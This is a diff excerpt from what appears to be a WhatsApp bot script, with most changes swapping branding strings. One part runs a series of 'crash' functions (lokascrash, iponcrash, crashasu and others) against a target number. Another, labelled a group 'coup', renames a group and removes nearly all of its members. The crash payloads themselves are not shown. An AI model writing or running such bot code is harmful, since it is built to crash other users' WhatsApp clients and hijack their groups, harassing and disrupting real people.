+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
 lokascrash(Pe, qiobatosai)
 dokucrash(Pe, qiobatosai)
 virgamcrash(Pe, qiobatosai)
@@ -13786,10 +13634,10 @@ await dokucrash(Pe, qiobatosai)
 await iponcrash(Pe, qiobatosai)
 await iponcrash(Pe)
 await crashasu(Pe, qiobatosai)
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
-qio.sendMessage(Pe, {text: 'https://www.instagram.com/coreinpin/'}, {quoted:m})
+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
+qio.sendMessage(Pe, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 𓅋'}, {quoted:m})
 lokascrash(Pe, qiobatosai)
 dokucrash(Pe, qiobatosai)
 virgamcrash(Pe, qiobatosai)
@@ -14338,13 +14186,13 @@ if (!isPrem) return qioreply(mess.prem)
 if (!isGroup) return m.reply(`Khusus Group Bego`)
 if (!isAdmins && !isDeveloper) return qioreply('Khusus Admin')
 if (!isBotAdmins) return m.reply(`Bot Bukan Admin Bego`)
-await qio.groupUpdateSubject(m.chat, 'Alfin Faridh Taufiqiy')
-await qio.groupUpdateDescription(m.chat, 'Alfin Faridh Taufiqiy')
+await qio.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙈𝙍./𝘼𝙇𝙒𝘼𝙔𝙎𝘼𝙌𝙄𝙊𝙊')
+await qio.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙈𝙍./𝘼𝙇𝙒𝘼𝙔𝙎𝘼𝙌𝙄𝙊𝙊')
 let data = participants.map((x) => x.id)
 for (let x of data) {
 if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
 await qio.groupParticipantsUpdate(m.chat, [x], "remove")
-await m.reply (`Alfin Faridh Taufiqiy`)
+await m.reply (`𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙈𝙍./𝘼𝙇𝙒𝘼𝙔𝙎𝘼𝙌𝙄𝙊𝙊`)
 }}}
 break
 //=================================================//
